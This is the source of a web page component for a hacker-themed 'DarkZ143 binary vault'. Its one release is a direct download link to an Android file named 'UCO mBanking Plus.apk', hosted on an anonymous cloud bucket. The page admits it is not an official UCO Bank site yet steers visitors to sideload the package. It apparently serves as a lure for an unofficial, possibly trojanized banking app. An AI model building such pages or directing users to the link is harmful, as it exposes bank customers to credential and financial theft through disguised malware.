import BootSequence from "./boot-sequence";
import VaultCatalog from "./vault-catalog";

const downloadUrl =
  "https://pub-8b7757f6961e4446bb1e0473b118ad34.r2.dev/UCO%20mBanking%20Plus.apk";

function ArrowIcon() {
  return (
    <svg aria-hidden="true" viewBox="0 0 20 20" fill="none">
      <path d="M4.5 10h10m-4-4 4 4-4 4" />
    </svg>
  );
}

function ExternalIcon() {
  return (
    <svg aria-hidden="true" viewBox="0 0 20 20" fill="none">
      <path d="M11 4h5v5m-.5-4.5L9 11m3-2v6H5V8h5" />
    </svg>
  );
}

export default function Home() {
  return (
    <>
      <BootSequence />
      <header className="site-header">
        <a className="brand" href="#top" aria-label="DarkZ143 repository home">
          <span className="brand-mark" aria-hidden="true"><span>D</span><span>Z</span></span>
          <span className="brand-copy">
            <strong>DARKZ143 <i>//</i> REPO</strong>
            <small><b /> [LOC: 0x0A] // SYS_OK // ROOT_ACTIVE</small>
          </span>
        </a>
        <div className="header-status" aria-label="Catalog status">
          <span className="status-block"><span>SYSTEM:</span> ONLINE</span>
          <span className="status-block"><span>RELEASES:</span> 01 LIVE</span>
        </div>
        <nav className="main-nav" aria-label="Main navigation">
          <a className="nav-active" href="#catalog">ALL BUILDS</a>
          <a href="#catalog">PC / DESKTOP</a>
          <a href="#catalog">MOBILE / ANDROID</a>
          <a href="#about">ABOUT</a>
        </nav>
        <a className="header-download" href="#catalog">ENTER VAULT <ArrowIcon /></a>
      </header>

      <main id="top">
        <section className="hero" aria-labelledby="hero-title">
          <div className="hero-grid" aria-hidden="true" />
          <div className="hero-inner">
            <div className="hero-meta">
              <span className="repo-version"><i /> REPOSITORY // MAIN BRANCH</span>
              <span className="meta-right">HOST: DARKZ143 <b>•</b> STATUS: <em>INDEXED</em></span>
            </div>
            <div className="hero-layout">
              <div className="hero-copy">
                <p className="eyebrow"><span>//</span> ZERO NOISE <b>·</b> DIRECT LINKS <b>·</b> BUILT FOR ANDROID</p>
                <h1 id="hero-title">DARKZ143<br /><span>BINARY VAULT</span><span className="cursor">_</span></h1>
                <p className="hero-description">A lean drop point for useful builds. Browse the live release, check its source, and keep an eye on the next uploads.</p>
                <div className="hero-actions">
                  <a className="button-primary" href="#catalog">BROWSE RELEASES <ArrowIcon /></a>
                  <span className="hero-side-note"><i /> ONE RELEASE ONLINE</span>
                </div>
              </div>
              <div className="terminal-card" aria-label="Catalog indexing terminal">
                <div className="terminal-topbar">
                  <div className="window-dots" aria-hidden="true"><i /><i /><i /></div>
                  <span>root@darkz143: ~/vault</span>
                  <span className="terminal-live"><i /> LIVE</span>
                </div>
                <div className="terminal-body">
                  <div className="terminal-line"><span className="prompt">root@darkz143:~$</span> vault --scan --mode=read-only</div>
                  <div className="terminal-line muted">[  OK  ] repository index mounted</div>
                  <div className="terminal-line muted">[  OK  ] release manifest loaded</div>
                  <div className="terminal-line muted">[ INFO ] external mirror detected</div>
                  <div className="terminal-divider" />
                  <div className="terminal-result"><span className="terminal-arrow">&gt;&gt;</span> 01 AVAILABLE RELEASE<span className="terminal-cursor">▋</span></div>
                  <div className="terminal-line terminal-foot">Next action: select a package below<span className="terminal-cursor">_</span></div>
                </div>
                <div className="terminal-footer"><span>SESSION: PUBLIC</span><span>MODE: SAFE READ</span><span>ARCH: MULTI</span></div>
              </div>
            </div>
            <div className="hero-stats" aria-label="Repository overview">
              <div><span className="stat-label">LIVE RELEASES</span><strong>01</strong><span className="stat-note">AVAILABLE NOW</span></div>
              <div><span className="stat-label">DISTRIBUTION</span><strong className="stat-text">DIRECT</strong><span className="stat-note">EXTERNAL MIRROR</span></div>
              <div><span className="stat-label">NEXT DROPS</span><strong className="stat-text">IN QUEUE</strong><span className="stat-note">COMING SOON</span></div>
              <div className="stats-signature"><span className="signature-symbol">⌁</span><span>SMALL CATALOG.<br />STRAIGHT TO THE FILE.</span></div>
            </div>
          </div>
        </section>

        <VaultCatalog />

        <section className="about-section" id="about">
          <div className="about-heading">
            <span className="section-kicker">// DISTRIBUTION NOTES</span>
            <h2>Clear source.<br /><span>Clean handoff.</span></h2>
          </div>
          <div className="about-copy">
            <div className="about-line"><span className="about-index">01</span><p>The available Android package opens from the external link supplied for this catalog.</p></div>
            <div className="about-line"><span className="about-index">02</span><p>Package version, file size, and checksum are shown only when confirmed release details are available.</p></div>
            <div className="about-line"><span className="about-index">03</span><p>Check the publisher and app details before installing any APK. This catalog is not an official UCO Bank site.</p></div>
          </div>
        </section>
      </main>

      <footer className="site-footer">
        <a className="footer-brand" href="#top">[ // BUILT BY DARKZ143 // ]</a>
        <span className="footer-center">DIRECT RELEASE CATALOG</span>
        <a className="footer-link" href={downloadUrl} target="_blank" rel="noopener noreferrer">MIRROR LINK <ExternalIcon /></a>
      </footer>
    </>
  );
}
